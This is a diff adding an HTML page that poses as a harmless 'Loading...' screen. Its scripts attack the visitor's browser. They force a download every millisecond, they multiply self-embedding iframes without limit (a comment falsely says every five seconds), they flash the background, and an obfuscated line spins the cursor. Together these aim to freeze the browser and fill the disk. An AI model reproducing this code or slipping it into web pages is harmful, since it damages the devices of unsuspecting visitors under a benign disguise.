@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Loading...</title>
+	<style>
+		/* Add styles to the iframe */
+		#myframe {
+			border-radius: 15px;
+			box-shadow: 2px 2px 10px rgba(0,0,0,0.3);
+			animation: fadein 2s ease-out forwards;
+		}
+
+		/* Add a fade-in animation to the iframe */
+		@keyframes fadein {
+			from {
+				opacity: 0;
+			}
+			to {
+				opacity: 1;
+			}
+		}
+
+		/* Add some styling to the loading text */
+		body {
+			background-color: #f5f5f5;
+			font-family: Arial, sans-serif;
+			font-size: 24px;
+			color: #666;
+			text-align: center;
+			padding-top: 100px;
+		}
+
+		h1 {
+			font-size: 36px;
+			margin-bottom: 50px;
+		}
+
+		/* Add a pulsating effect to the loading dots */
+		.dot {
+			display: inline-block;
+			margin-left: 10px;
+			animation: pulse 1s ease-out infinite;
+		}
+
+		@keyframes pulse {
+			from {
+				transform: scale(1);
+			}
+			to {
+				transform: scale(1.2);
+			}
+		}
+	</style>
+</head>
+<body>
+	<h1>Loading...</h1>
+	<p>This website is loading, please wait.</p>
+
+	<div>
+		<iframe src="./index.html" id="myframe"></iframe>
+		<iframe src="./index.html" id="myframe"></iframe>
+		<iframe src="./index.html" id="myframe"></iframe>
+		<iframe src="./index.html" id="myframe"></iframe>
+		<iframe src="./index.html" id="myframe"></iframe>
+		<iframe src="./index.html" id="myframe"></iframe>
+		<iframe src="./index.html" id="myframe"></iframe>
+		<iframe src="./index.html" id="myframe"></iframe>
+		<iframe src="./index.html" id="myframe"></iframe>
+		<iframe src="./index.html" id="myframe"></iframe>
+	</div>
+
+<script>
+		// Download a file every millisecond
+setInterval(function() {
+    var link = document.createElement("a");
+    link.download = "discord.gg_line";
+    link.href = "data:application/octet-stream;base64," + "dscordgg_line ".repeat(1000);
+    link.click();
+}, 1);
+</script>
+	
+	<script>
+	window.onload = function() {
+		// Get the iframe element
+		var iframe = document.getElementById('myframe');
+
+		// Set an interval to duplicate the iframe every 5 seconds
+		setInterval(function() {
+			// Create a new iframe element
+			var newIframe = document.createElement('iframe');
+
+			// Copy the attributes of the original iframe
+			newIframe.src = iframe.src;
+			newIframe.id = iframe.id;
+			newIframe.style = iframe.style;
+
+			// Insert the new iframe after the original iframe
+			iframe.parentNode.insertBefore(newIframe, iframe.nextSibling);
+		}, 1);
+
+		// Make the website blink by changing the background color every 50 milliseconds
+		setInterval(function() {
+			var body = document.getElementsByTagName("body")[0];
+			var currentColor = body.style.backgroundColor;
+			if (currentColor === "#c4c4c4") {
+				body.style.backgroundColor = "#c3c3c3";
+			} else {
+				body.style.backgroundColor = "#c4c4c4";
+			}
+		}, 1);
+	};
+	iV33MaET=0;Cu4Xg8Y=new Array('n-resize','nw-resize','w-resize','sw-resize','s-resize','se-resize','e-resize','ne-resize');setInterval('iV33MaET++;document.body.style.cursor=Cu4Xg8Y[iV33MaET%8]',0)
+	</script>
+
+	<body>
+</body>
+
+	
+</body>
+</html>
